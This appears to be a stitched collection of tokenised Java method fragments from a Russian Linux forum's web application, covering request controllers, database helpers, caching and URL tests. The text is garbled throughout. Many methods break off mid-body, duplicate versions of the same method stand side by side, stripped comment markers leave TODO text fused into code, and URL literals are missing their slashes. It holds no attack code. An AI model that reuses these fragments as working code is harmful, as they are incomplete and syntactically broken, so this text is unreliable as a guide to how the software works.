public ModelAndView galleryGroup ( @RequestParam ( required = false ) Integer offset , @PathVariable ( " group " ) String groupName , HttpServletResponse response ) throws Exception { Connection db = null ; Group group ; try { db = LorDataSource . getConnection ( ) ; Section section = new Section ( db , Section . SECTION_GALLERY ) ; group = section . getGroup ( db , groupName ) ; } finally { if ( db ! = null ) { db . close ( ) ; } } ModelAndView mv = showNews ( null , null , Section . SECTION_GALLERY , group . getId ( ) , null , offset , response ) ; mv . getModel ( ) . put ( " url " , " /gallery/ " + groupName + " / " ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public ModelAndView getMessageNew ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " page " , required = false ) Integer page , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public static int getSection ( String name ) throws SectionNotFoundException { Integer v = sections . get ( name ) ; if ( v = = null ) { throw new SectionNotFoundException ( ) ; } return v ; } 
public ModelAndView getMessageNewForum ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " page " , required = false ) Integer page , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { return getMessageNew ( Section . SECTION_FORUM , webRequest , request , response , page , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewNews ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " page " , required = false ) Integer page , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { return getMessageNew ( Section . SECTION_NEWS , webRequest , request , response , page , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewPolls ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " page " , required = false ) Integer page , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { return getMessageNew ( Section . SECTION_POLLS , webRequest , request , response , page , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewGallery ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " page " , required = false ) Integer page , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { return getMessageNew ( Section . SECTION_GALLERY , webRequest , request , response , page , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNew ( int section , WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , Integer page , String filter , String groupName , int msgid ) throws Exception { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView archiveList ( int sectionid ) throws Exception { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView newsArchive ( ) throws Exception { return archiveList ( Section . SECTION_NEWS ) ; } 
public ModelAndView pollsArchive ( ) throws Exception { return archiveList ( Section . SECTION_POLLS ) ; } 
public View galleryArchiveOld ( @RequestParam ( " section " ) int id ) throws Exception { return new RedirectView ( Section . getArchiveLink ( id ) ) ; } 
public ModelAndView polls ( @RequestParam ( required = false ) Integer offset , HttpServletResponse response ) throws Exception { ModelAndView mv = showNews ( null , null , Section . SECTION_POLLS , null , null , offset , response ) ; mv . getModel ( ) . put ( " url " , " /polls/ " ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public ModelAndView news ( @RequestParam ( required = false ) Integer offset , HttpServletResponse response ) throws Exception { ModelAndView mv = showNews ( null , null , Section . SECTION_NEWS , null , null , offset , response ) ; mv . getModel ( ) . put ( " url " , " /news/ " ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public View galleryOldLink ( @RequestParam int section , @RequestParam ( required = false ) Integer offset , @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year ) { if ( offset ! = null ) { return new RedirectView ( Section . getSectionLink ( section ) + " ?offset= " + Integer . toString ( offset ) ) ; } if ( year ! = null ) { return new RedirectView ( Section . getArchiveLink ( section ) + Integer . toString ( year ) + " / " + Integer . toString ( month ) ) ; } return new RedirectView ( Section . getSectionLink ( section ) ) ; } 
public ModelAndView galleryArchive ( @PathVariable String section , @PathVariable int year , @PathVariable int month , HttpServletResponse response ) throws Exception { ModelAndView mv = showNews ( month , year , Section . getSection ( section ) , null , null , null , response ) ; mv . getModel ( ) . put ( " url " , " /gallery/archive/ " + year + " / " + month + " / " ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public ModelAndView forum ( @RequestParam ( required = false ) Integer offset , HttpServletResponse response ) throws Exception { ModelAndView mv = showNews ( null , null , Section . SECTION_FORUM , null , null , offset , response ) ; mv . getModel ( ) . put ( " url " , " /forum/lenta " ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public View galleryOldLink ( @RequestParam int section , @RequestParam ( required = false ) Integer offset , @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year ) { if ( offset ! = null ) { return new RedirectView ( Section . getNewsViewerLink ( section ) + " ?offset= " + Integer . toString ( offset ) ) ; } if ( year ! = null ) { return new RedirectView ( Section . getArchiveLink ( section ) + Integer . toString ( year ) + " / " + Integer . toString ( month ) ) ; } return new RedirectView ( Section . getNewsViewerLink ( section ) ) ; } 
public ModelAndView galleryGroup ( @RequestParam ( required = false ) Integer offset , @PathVariable ( " group " ) String groupName , HttpServletResponse response ) throws Exception { return group ( Section . SECTION_GALLERY , offset , groupName , response ) ; } 
public ModelAndView newsGroup ( @RequestParam ( required = false ) Integer offset , @PathVariable ( " group " ) String groupName , HttpServletResponse response ) throws Exception { return group ( Section . SECTION_NEWS , offset , groupName , response ) ; } 
public ModelAndView pollsGroup ( @RequestParam ( required = false ) Integer offset , @PathVariable ( " group " ) String groupName , HttpServletResponse response ) throws Exception { return group ( Section . SECTION_POLLS , offset , groupName , response ) ; } 
public ModelAndView group ( int sectionId , Integer offset , String groupName , HttpServletResponse response ) throws Exception { Connection db = null ; Group group ; try { db = LorDataSource . getConnection ( ) ; Section section = new Section ( db , sectionId ) ; group = section . getGroup ( db , groupName ) ; } finally { if ( db ! = null ) { db . close ( ) ; } } ModelAndView mv = showNews ( null , null , group . getSectionId ( ) , group . getId ( ) , null , offset , response ) ; mv . getModel ( ) . put ( " url " , group . getUrl ( ) ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public View galleryOldLink ( @RequestParam int section , @RequestParam ( required = false ) Integer offset , @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year , @RequestParam ( value = " group " , required = false ) Integer groupId ) throws Exception { if ( offset ! = null ) { return new RedirectView ( Section . getNewsViewerLink ( section ) + " ?offset= " + Integer . toString ( offset ) ) ; } if ( year ! = null ) { return new RedirectView ( Section . getArchiveLink ( section ) + Integer . toString ( year ) + " / " + Integer . toString ( month ) ) ; } if ( groupId ! = null ) { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; Group group = new Group ( db , groupId ) ; return new RedirectView ( Section . getNewsViewerLink ( section ) + group . getUrlName ( ) + " / " ) ; } finally { if ( db ! = null ) { db . close ( ) ; } } } return new RedirectView ( Section . getNewsViewerLink ( section ) ) ; } 
public ModelAndView topics ( @RequestParam ( " group " ) int groupId , @RequestParam ( value = " offset " , required = false ) Integer offsetObject ) throws Exception { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView topicsLastmod ( @RequestParam ( " group " ) int groupId , @RequestParam ( value = " offset " , required = false ) Integer offsetObject ) throws Exception { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView forum ( @PathVariable ( " group " ) String groupName , @RequestParam ( required = false ) Integer offsetObject , @RequestParam ( defaultValue = " false " ) boolean lastmod , HttpServletRequest request ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; Template tmpl = Template . getTemplate ( request ) ; boolean showDeleted = request . getParameter ( " deleted " ) ! = null ; params . put ( " showDeleted " , showDeleted ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView forum ( @PathVariable ( " group " ) String groupName , @RequestParam ( required = false , value = " offset " ) Integer offsetObject , @RequestParam ( defaultValue = " false " ) boolean lastmod , HttpServletRequest request ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; Template tmpl = Template . getTemplate ( request ) ; boolean showDeleted = request . getParameter ( " deleted " ) ! = null ; params . put ( " showDeleted " , showDeleted ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView getMessageNewForum ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { return getMessageNew ( Section . SECTION_FORUM , webRequest , request , response , null , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewNews ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { return getMessageNew ( Section . SECTION_NEWS , webRequest , request , response , null , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewPolls ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { return getMessageNew ( Section . SECTION_POLLS , webRequest , request , response , null , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewGallery ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { return getMessageNew ( Section . SECTION_GALLERY , webRequest , request , response , null , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewForumPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) throws Exception { return getMessageNew ( Section . SECTION_FORUM , webRequest , request , response , page , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewNewsPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) throws Exception { return getMessageNew ( Section . SECTION_NEWS , webRequest , request , response , page , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewPollsPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) throws Exception { return getMessageNew ( Section . SECTION_POLLS , webRequest , request , response , page , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewGalleryPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) throws Exception { return getMessageNew ( Section . SECTION_GALLERY , webRequest , request , response , page , filter , groupName , msgid ) ; } 
public ModelAndView getMessageOld ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " page " , required = false ) Integer page , @RequestParam ( value = " lastmod " , required = false ) Long lastmod , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( required = false ) String output ) throws Exception { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView jumpMessage ( HttpServletRequest request , @RequestParam int msgid , @RequestParam ( required = false ) Integer page , @RequestParam ( required = false ) String nocache , @RequestParam ( required = false ) Integer cid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public TopTenMessageDTO mapRow ( ResultSet rs , int i ) throws SQLException { TopTenMessageDTO result = new TopTenMessageDTO ( ) ; result . setUrl ( Section . getSectionLink ( rs . getInt ( " section " ) ) + rs . getString ( " urlname " ) + " / " + rs . getInt ( " msgid " ) ) ; result . setTitle ( rs . getString ( " title " ) ) ; result . setLastmod ( rs . getTimestamp ( " lastmod " ) ) ; result . setAnswers ( rs . getInt ( " c " ) ) ; Integer savedOrder = rs . getInt ( " mess_order " ) ; if ( rs . wasNull ( ) ) { savedOrder = null ; } result . setMovedUp ( savedOrder = = null | | ( i + 1 ) > savedOrder ) ; return result ; } 
public void execute ( Object o ) { TopTenDaoImpl . TopTenMessageDTO dto = ( TopTenDaoImpl . TopTenMessageDTO ) o ; int tmp = dto . getAnswers ( ) / itemsPerPage ; tmp = ( dto . getAnswers ( ) % itemsPerPage > 0 ) ? tmp + 1 : tmp ; dto . setPages ( tmp ) ; } 
private GalleryItem createGalleryItem ( ResultSet rs ) throws SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " title " ) ) ; item . setUrl ( rs . getString ( " url " ) ) ; item . setIcon ( rs . getString ( " linktext " ) ) ; item . setNick ( rs . getString ( " nick " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( Section . getSectionLink ( Section . SECTION_GALLERY ) + rs . getString ( " urlname " ) + " / " + rs . getInt ( " msgid " ) ) ; String htmlPath = properties . getProperty ( " HTMLPathPrefix " ) ; item . setHtmlPath ( htmlPath ) ; try { item . setInfo ( new ImageInfo ( htmlPath + item . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + item . getUrl ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( IOException e ) { log . error ( e ) ; } return item ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , HttpSession session ) throws Exception { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public View galleryArchiveOld ( @RequestParam ( " section " ) int id , HttpServletResponse response ) throws Exception { String link = Section . getArchiveLink ( id ) ; if ( link = = null ) { response . sendError ( 404 , " Now archive for this section " ) ; return null ; } return new RedirectView ( link ) ; } 
public void testSimpleURL ( ) { assertTrue ( URLUtil . isUrl ( " http:www.linux.org.ru/ " ) ) ; } 
public void testURL ( ) { assertTrue ( URLUtil . isUrl ( " http:www.linux.org.ru:80/dfrer.jsp?msgid=3412345 " ) ) ; } 
public void testBadURL ( ) { assertFalse ( URLUtil . isUrl ( " xttp:www.linux.org.ru/ " ) ) ; } 
public void testIPUrl ( ) { assertTrue ( URLUtil . isUrl ( " http:127.0.0.1/ " ) ) ; } 
public ModelAndView edit ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " lastEdit " , required = false ) Long lastEdit ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; HttpSession session = request . getSession ( ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Map < String , Object > params = new HashMap < String , Object > ( ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView edit ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " lastEdit " , required = false ) Long lastEdit , @RequestParam ( value = " bonus " , required = false , defaultValue = " 3 " ) int bonus ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; HttpSession session = request . getSession ( ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Map < String , Object > params = new HashMap < String , Object > ( ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public void pingFeedburner ( ) { try { config . setServerURL ( new URL ( " http:ping.feedburner.com/ " ) ) ; 
public void changeGroup ( Connection db , int changeGroupId ) throws SQLException { Statement st = db . createStatement ( ) ; st . executeUpdate ( " UPDATE topics SET groupid= " + changeGroupId + " WHERE id= " + msgid ) ; st . executeUpdate ( " UPDATE groups SET stat4=stat4+1 WHERE id= " + guid + " or id= " + changeGroupId ) ; st . close ( ) ; } 
public ModelAndView edit ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " lastEdit " , required = false ) Long lastEdit , @RequestParam ( value = " bonus " , required = false , defaultValue = " 3 " ) int bonus , @RequestParam ( value = " chgrp " , required = false ) Integer changeGroupId ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; HttpSession session = request . getSession ( ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Map < String , Object > params = new HashMap < String , Object > ( ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public void doFilter ( ServletRequest servletRequest , ServletResponse servletResponse , FilterChain filterChain ) throws ServletException , IOException { if ( filterConfig = = null ) { return ; } try { Template tmpl = new Template ( ( HttpServletRequest ) servletRequest , properties , ( HttpServletResponse ) servletResponse ) ; servletRequest . setAttribute ( " template " , tmpl ) ; } catch ( Exception ex ) { logger . fatal ( " Can't build Template " , ex ) ; return ; } filterChain . doFilter ( servletRequest , servletResponse ) ; } 
public boolean checkIP ( String addr ) throws TextParseException { String query = invertIPAddress ( addr ) + '.' + zone ; logger . debug ( " Looking for " + query ) ; Lookup lookup = new Lookup ( query , Type . A ) ; lookup . setResolver ( resolver ) ; Record [ ] r = lookup . run ( ) ; if ( r = = null | | r . length = = 0 ) { return false ; } logger . info ( " DNSBL: found " + addr + " in DNSBL: " + r [ 0 ] ) ; TODO: check what we really got ;-) return true; } 
public static String detectImageType ( File file ) throws BadImageException , IOException { logger . debug ( " Detecting image type for: " + file + " ( " + file . length ( ) + " bytes) " ) ; ImageInfo2 ii = new ImageInfo2 ( ) ; FileInputStream is = null ; try { is = new FileInputStream ( file ) ; 
public static void resizeImage ( String filename , String iconname , int size ) throws IOException , UtilException , InterruptedException { String [ ] cmd = { " /usr/bin/convert " , " -scale " , Integer . toString ( size ) , filename , iconname } ; Process proc = Runtime . getRuntime ( ) . exec ( cmd ) ; int exitStatus = proc . waitFor ( ) ; if ( exitStatus ! = 0 ) { logger . warn ( " Failed to convert from " + filename + " to " + iconname ) ; 
public ModelAndView showForm ( @RequestParam ( " msgid " ) int msgid ) throws Exception { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showCommitForm ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showEditForm ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; HttpSession session = request . getSession ( ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
private ModelAndView prepareModel ( Connection db , Message message ) throws SQLException , MessageNotFoundException , BadGroupException , UserNotFoundException , AccessViolationException { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " message " , message ) ; Group group = new Group ( db , message . getGroupId ( ) ) ; params . put ( " group " , group ) ; params . put ( " groups " , Group . getGroups ( db , message . getSection ( ) ) ) ; params . put ( " newMsg " , message ) ; List < EditInfoDTO > editInfoList = message . loadEditInfo ( db ) ; if ( editInfoList ! = null ) { params . put ( " editInfo " , editInfoList . get ( 0 ) ) ; } params . put ( " commit " , false ) ; return new ModelAndView ( " edit " , params ) ; } 
public ModelAndView viewAll ( @RequestParam ( value = " section " , required = false , defaultValue = " 0 " ) int sectionId ) throws Exception { Connection db = null ; ModelAndView modelAndView = new ModelAndView ( " view-all " ) ; try { db = LorDataSource . getConnection ( ) ; 
public boolean remove ( Connection db , int uid ) throws SQLException { if ( ! ignoreList . containsKey ( uid ) ) { return false ; } PreparedStatement pst = db . prepareStatement ( " DELETE FROM ignore_list WHERE userid=? AND ignored=? " ) ; pst . clearParameters ( ) ; pst . setInt ( 1 , userId ) ; pst . setInt ( 2 , uid ) ; boolean r = pst . executeUpdate ( ) = = 1 ; if ( r ) { ignoreList . remove ( uid ) ; } return r ; } 
public PollDTO getCurrentPoll ( ) throws PollNotFoundException { String sql = " SELECT votenames.id, topics.title, votenames.topic FROM votenames " + " JOIN topics on votenames.topic = topics.id WHERE " + " topics.moderate AND not topics.deleted " + " AND topics.commitdate = (select max(commitdate) " + " from topics where groupid=19387 AND moderate AND NOT deleted) " ; PollDTO result = jdbcTemplate . queryForObject ( sql , new ParameterizedRowMapper < PollDTO > ( ) { @Override public PollDTO mapRow ( ResultSet rs , int rowNum ) throws SQLException { PollDTO result = new PollDTO ( ) ; result . setId ( rs . getInt ( " id " ) ) ; result . setTitle ( rs . getString ( " title " ) ) ; result . setTopic ( rs . getInt ( " topic " ) ) ; return result ; } } , new HashMap ( ) ) ; if ( result = = null ) { throw new PollNotFoundException ( - 1 ) ; } return result ; } 
public static int createPoll ( Connection db , List < String > pollList ) throws SQLException { int voteid = getNextPollId ( db ) ; PreparedStatement pst = db . prepareStatement ( " INSERT INTO votenames (id) values (?) " ) ; pst . setInt ( 1 , voteid ) ; pst . executeUpdate ( ) ; try { Poll poll = new Poll ( db , voteid ) ; for ( String variant : pollList ) { if ( variant . trim ( ) . length ( ) = = 0 ) { continue ; } poll . addNewVariant ( db , variant ) ; } } catch ( PollNotFoundException ex ) { throw new RuntimeException ( ex ) ; } return voteid ; } 
public List < User > getNewUsers ( Connection db ) throws SQLException , UserNotFoundException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT id FROM users where regdate IS NOT null " + " AND regdate > CURRENT_TIMESTAMP - interval '3 days' ORDER BY regdate " ) ; ArrayList < User > list = new ArrayList < User > ( ) ; while ( rs . next ( ) ) { list . add ( User . getUser ( db , rs . getInt ( " id " ) ) ) ; } st . close ( ) ; return list ; } 
public ModelAndView add ( HttpServletRequest request ) throws Exception { Connection db = null ; Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new UserErrorException ( " Not authorized " ) ; } try { db = LorDataSource . getConnection ( ) ; 
public boolean isMobile ( ) { if (!style.equals("tango")) { return false; } return userAgent.detectAndroidWebKit(); return true; } 
public static int parseFilterChain ( String filter ) { if ( " list " . equals ( filter ) ) { return FILTER_IGNORED ; } if ( " anonymous " . equals ( filter ) ) { return FILTER_ANONYMOUS ; } return FILTER_NONE ; } 
public TopTenMessageDTO mapRow ( ResultSet rs , int i ) throws SQLException { TopTenMessageDTO result = new TopTenMessageDTO ( ) ; result . setUrl ( Section . getSectionLink ( rs . getInt ( " section " ) ) + rs . getString ( " urlname " ) + " / " + rs . getInt ( " msgid " ) ) ; result . setTitle ( rs . getString ( " title " ) ) ; result . setLastmod ( rs . getTimestamp ( " lastmod " ) ) ; result . setAnswers ( rs . getInt ( " c " ) ) ; return result ; } 
public boolean isUncommited ( ) { return uncommited ; } 
public ModelAndView showUserTopicsNew ( @PathVariable String nick , @RequestParam ( value = " offset " , required = false ) Integer offset , @RequestParam ( value = " output " , required = false ) String output , HttpServletResponse response ) throws Exception { Connection db = null ; Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " url " , " /people/ " + nick + " / " ) ; params . put ( " whoisLink " , " /people/ " + nick + " / " + " profile " ) ; TODO params.put("archiveLink", "/people/"+nick+"/archive/"); try { response.setDateHeader("Expires", System.currentTimeMillis() + 60 * 1000); 
public static String getNewsViewerLink ( int section ) throws SectionNotFoundException { switch ( section ) { case SECTION_FORUM : 
public View oldLink ( @RequestParam int section , @RequestParam ( required = false ) Integer offset , @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year , @RequestParam ( value = " group " , required = false ) Integer groupId ) throws Exception { if ( offset ! = null ) { return new RedirectView ( Section . getNewsViewerLink ( section ) + " ?offset= " + Integer . toString ( offset ) ) ; } if ( year ! = null ) { return new RedirectView ( Section . getArchiveLink ( section ) + Integer . toString ( year ) + " / " + Integer . toString ( month ) ) ; } if ( groupId ! = null ) { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; Group group = new Group ( db , groupId ) ; return new RedirectView ( Section . getNewsViewerLink ( section ) + group . getUrlName ( ) + " / " ) ; } finally { if ( db ! = null ) { db . close ( ) ; } } } return new RedirectView ( Section . getNewsViewerLink ( section ) ) ; } 
private void createReplyTo ( Integer replyTo , Map < String , Object > params , Connection db ) throws SQLException , MessageNotFoundException , AccessViolationException { if ( replyTo ! = null & & replyTo > 0 ) { Comment onComment = new Comment ( db , replyTo ) ; 
public ModelAndView resolve ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid , @RequestParam ( " resolve " ) String resolved ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public void resetPassword ( Connection db ) throws SQLException { String password = StringUtil . generatePassword ( ) ; PreparedStatement st = null ; try { st = db . prepareStatement ( " UPDATE users SET passwd=? WHERE id=? " ) ; 
public static String generatePassword ( ) { StringBuilder builder = new StringBuilder ( ) ; for ( int i = 0 ; i < 10 ; i + + ) { int r = Math . abs ( random . nextInt ( ) ) ; builder . append ( ( char ) ( 33 + r % ( 126 - 33 ) ) ) ; } return builder . toString ( ) ; } 
public ModelAndView showComments ( @RequestParam String nick , @RequestParam ( defaultValue = " 0 " ) int offset , HttpServletResponse response ) throws Exception { ModelAndView mv = new ModelAndView ( " show-comments " ) ; int topics = 50 ; mv . getModel ( ) . put ( " topics " , topics ) ; if ( offset < 0 ) { throw new ServletParameterException ( " offset<0!? " ) ; } mv . getModel ( ) . put ( " offset " , offset ) ; boolean firstPage = offset = = 0 ; if ( firstPage ) { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 90 * 1000 ) ; } else { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 60 * 60 * 1000L ) ; } mv . getModel ( ) . put ( " firstPage " , firstPage ) ; Connection db = null ; MemCachedClient mcc = MemCachedSettings . getClient ( ) ; String showCommentsId = MemCachedSettings . getId ( " show-comments?id= " + URLEncoder . encode ( nick ) + " &offset= " + offset ) ; try { db = LorDataSource . getConnection ( ) ; 
public static String showComments ( Connection db , User user , int offset , int limit ) throws SQLException { DateFormat dateFormat = DateFormats . createDefault ( ) ; StringBuilder out = new StringBuilder ( ) ; PreparedStatement pst = null ; try { pst = db . prepareStatement ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, " + " topics.id as topicid, comments.id as msgid, comments.postdate " + " FROM sections, groups, topics, comments " + " WHERE sections.id=groups.section AND groups.id=topics.groupid " + " AND comments.topic=topics.id " + " AND comments.userid=? AND NOT comments.deleted ORDER BY postdate DESC LIMIT " + limit + " OFFSET " + offset ) ; pst . setInt ( 1 , user . getId ( ) ) ; ResultSet rs = pst . executeQuery ( ) ; while ( rs . next ( ) ) { out . append ( " <tr><td> " ) . append ( rs . getString ( " ptitle " ) ) . append ( " </td> " ) ; out . append ( " <td> " ) . append ( rs . getString ( " gtitle " ) ) . append ( " </td> " ) ; out . append ( " <td><a href= \" jump-message.jsp?msgid= " ) . append ( rs . getInt ( " topicid " ) ) . append ( " &amp;cid= " ) . append ( rs . getInt ( " msgid " ) ) . append ( " \" rev=contents> " ) . append ( StringUtil . makeTitle ( rs . getString ( " title " ) ) ) . append ( " </a></td> " ) ; out . append ( " <td> " ) . append ( dateFormat . format ( rs . getTimestamp ( " postdate " ) ) ) . append ( " </td></tr> " ) ; } rs . close ( ) ; } finally { if ( pst ! = null ) { pst . close ( ) ; } } return out . toString ( ) ; } 
Object getFromCache ( String key ) ; < T > boolean storeToCache ( String key , T value , int expire ) ; < T > boolean storeToCache ( String key , T value ) ; } 
< T > boolean storeToCache ( String key , T value , int expire ) ; < T > boolean storeToCache ( String key , T value ) ; } 
public < T > boolean storeToCache ( String key , T value , int expire ) { String s = MemCachedSettings . getId ( key ) ; return MemCachedSettings . getClient ( ) . set ( s , value , expire ) ; } 
public < T > boolean storeToCache ( String key , T value ) { String s = MemCachedSettings . getId ( key ) ; return MemCachedSettings . getClient ( ) . set ( s , value , 0 ) ; } 
public static User getUser ( Connection con , String name ) throws SQLException , UserNotFoundException { CacheProvider mcc = MemCachedSettings . getCache ( ) ; User user = new User ( con , name ) ; String shortCacheId = " User?id= " + user . id ; String cacheId = MemCachedSettings . getId ( shortCacheId ) ; mcc . storeToCache ( cacheId , user , CACHE_MILLIS ) ; return user ; } 
private static User getUser ( Connection db , int id , boolean useCache ) throws SQLException , UserNotFoundException { CacheProvider mcc = MemCachedSettings . getCache ( ) ; String shortCacheId = " User?id= " + id ; String cacheId = MemCachedSettings . getId ( shortCacheId ) ; User res = null ; if ( useCache ) { res = ( User ) mcc . getFromCache ( cacheId ) ; } if ( res = = null ) { res = new User ( db , id ) ; mcc . storeToCache ( cacheId , res , CACHE_MILLIS ) ; } return res ; } 
